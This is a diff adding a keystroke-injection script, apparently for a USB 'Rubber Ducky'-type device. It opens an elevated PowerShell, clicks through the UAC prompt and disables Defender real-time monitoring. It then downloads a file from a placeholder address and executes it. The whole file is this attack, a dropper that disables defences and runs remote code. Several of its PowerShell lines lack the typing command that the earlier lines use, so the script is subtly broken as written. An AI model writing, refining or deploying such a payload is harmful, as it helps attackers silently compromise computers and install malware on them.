@@ -1,0 +1,29 @@
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 900
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+DELAY 150
+ENTER
+DELAY 200
+$url = "http://adress/payload.test"
+DELAY 150
+ENTER
+DELAY 200
+$output = "DownloadDestination\payload.test"
+DELAY 150
+ENTER
+DELAY 200
+Invoke-WebRequest -Uri $url -OutFile $output
+DELAY 150
+ENTER
+DELAY 200
+$e = New-Object -com shell.application; $e.shellexecute($output)
+DELAY 150
+ENTER
+DELAY 200
+exit
+ENTER
